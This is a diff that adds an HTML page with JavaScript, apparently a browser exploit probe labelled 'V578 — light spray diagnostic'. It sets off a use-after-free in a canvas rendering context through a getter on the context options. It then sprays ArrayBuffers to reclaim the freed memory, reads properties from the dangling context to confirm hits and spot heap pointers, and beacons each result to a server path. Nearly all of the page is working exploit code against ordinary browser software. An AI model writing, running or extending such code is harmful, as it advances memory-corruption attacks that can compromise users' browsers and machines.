@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V578</title></head>
+<body><pre id="out">V578 — light spray diagnostic</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(tag,body){
+  var u='/beacon/V578-'+tag+'?d='+encodeURIComponent(String(body).slice(0,400))+'&t='+Date.now();
+  try{new Image().src=u;}catch(e){}
+  setTimeout(function(){try{new Image().src=u+'&r=2';}catch(e){}},200);
+  setTimeout(function(){try{new Image().src=u+'&r=3';}catch(e){}},500);
+}
+var f64=new Float64Array(1);
+var u32=new Uint32Array(f64.buffer);
+function dblHex(d){f64[0]=d;return'0x'+('00000000'+u32[1].toString(16)).slice(-8)+('00000000'+u32[0].toString(16)).slice(-8);}
+
+var P=new URLSearchParams(location.search);
+var NSAVES=+(P.get('saves')||'32');
+var NSPRAY=+(P.get('spray')||'100');
+
+function wtfVectorCap(needed) {
+  if (needed <= 1) return 1;
+  var cap = 1;
+  while (cap < needed) {
+    cap = Math.max(cap + 1, Math.max(16, Math.floor(cap + cap / 4 + 1)));
+  }
+  return cap;
+}
+var VCAP = wtfVectorCap(NSAVES + 1);
+var BUF = VCAP * 400;
+
+bk('BOOT','saves='+NSAVES+',spray='+NSPRAY+',vcap='+VCAP+',buf='+BUF);
+say('V578 saves='+NSAVES+' spray='+NSPRAY+' vcap='+VCAP+' buf='+BUF);
+
+/* ===== UAF ===== */
+var innerCtx = null;
+function triggerUAF() {
+  var c = document.createElement('canvas');
+  c.width = 1; c.height = 1;
+  var d = {};
+  Object.defineProperty(d, 'alpha', {get: function() {
+    var ctx = c.getContext('2d');
+    innerCtx = ctx;
+    ctx.lineWidth = 1337.1337;
+    for (var s = 0; s < NSAVES; s++) ctx.save();
+    ctx.lineWidth = 1337.1337;
+    return true;
+  }});
+  c.getContext('bitmaprenderer', d);
+  return c;
+}
+
+bk('PRE-UAF','triggering');
+
+/* Pre-allocate spray array BEFORE UAF to avoid 768B allocs after free */
+var sprayABs = [];
+
+var outerC = triggerUAF();
+
+/* ======== CRITICAL SECTION — no Image/bk() until after reads ======== */
+
+/* Light spray: NSPRAY ABs of exact buffer size only.
+   Class 13824 (ceil(13600/512)*512). Single size, fast. */
+for (var i = 0; i < NSPRAY; i++) {
+  try {
+    var ab = new ArrayBuffer(BUF);
+    var dv = new Float64Array(ab);
+    for (var j = 0; j < dv.length; j++) dv[j] = 10000000 + j;
+    sprayABs.push(ab);
+  } catch(e) { break; }
+}
+
+/* Read all properties before ANY beacon */
+var results = {};
+var props = ['lineWidth','miterLimit','globalAlpha','shadowBlur','lineDashOffset'];
+for (var pi = 0; pi < props.length; pi++) {
+  try {
+    results[props[pi]] = innerCtx[props[pi]];
+  } catch(e) {
+    results[props[pi]] = 'ERR:'+e.name;
+  }
+}
+var xf = null;
+try { xf = innerCtx.getTransform(); } catch(e) { xf = 'ERR:'+e.name; }
+
+/* ======== END CRITICAL SECTION ======== */
+
+bk('SPRAY','n='+sprayABs.length+',sz='+BUF);
+say('Sprayed '+sprayABs.length+' ABs of '+BUF+'B');
+
+/* Report all results */
+var lw = results.lineWidth;
+if (typeof lw === 'string') {
+  bk('CRASH','read-failed,'+lw);
+  say('\nCRASH: lineWidth read failed: '+lw);
+} else {
+  bk('LW','val='+lw+',hex='+dblHex(lw));
+  say('\nlineWidth = '+lw);
+  say('  hex: '+dblHex(lw));
+
+  var isOrig = (Math.abs(lw - 1337.1337) < 0.01);
+  var isZero = (lw === 0);
+  var isHit = (lw >= 10000000 && lw < 20000000);
+
+  if (isOrig) {
+    bk('ORIG','spray-missed,delta='+(lw-1337.1337));
+    say('  ORIGINAL (delta='+(lw-1337.1337)+') — spray missed');
+  } else if (isZero) {
+    bk('ZERO','calloc-zeroed');
+    say('  ZERO — buffer reclaimed but fill missed lineWidth offset');
+  } else if (isHit) {
+    var slot = Math.round(lw - 10000000);
+    var byteOff = slot * 8;
+    bk('HIT','slot='+slot+',byte='+byteOff);
+    say('  *** AB HIT *** slot='+slot+' byte='+byteOff);
+    for (var lwOff = 0; lwOff <= 256; lwOff += 8) {
+      var ssz = (byteOff - lwOff) / NSAVES;
+      if (ssz === Math.floor(ssz) && ssz >= 350 && ssz <= 500) {
+        bk('SIZEOF','lwOff='+lwOff+',sizeof='+ssz);
+        say('  sizeof(State)='+ssz+' if lineWidth@+'+lwOff);
+      }
+    }
+  } else {
+    bk('UNK','val='+lw+',hex='+dblHex(lw));
+    say('  *** UNEXPECTED — possible heap pointer ***');
+  }
+
+  /* Other properties */
+  for (var pi = 1; pi < props.length; pi++) {
+    var v = results[props[pi]];
+    if (typeof v === 'string') {
+      bk(props[pi].slice(0,3).toUpperCase()+'-X',v);
+      say('  '+props[pi]+': '+v);
+    } else {
+      bk(props[pi].slice(0,3).toUpperCase(),'val='+v+',hex='+dblHex(v));
+      say('  '+props[pi]+'='+v+' hex='+dblHex(v));
+    }
+  }
+
+  if (xf && typeof xf !== 'string') {
+    bk('XF','a='+dblHex(xf.a)+',d='+dblHex(xf.d));
+    say('  xform: a='+xf.a+' b='+xf.b+' c='+xf.c+' d='+xf.d+' e='+xf.e+' f='+xf.f);
+  }
+}
+
+bk('DONE','complete');
+say('\nV578 complete.');
+</script>
+</body></html>
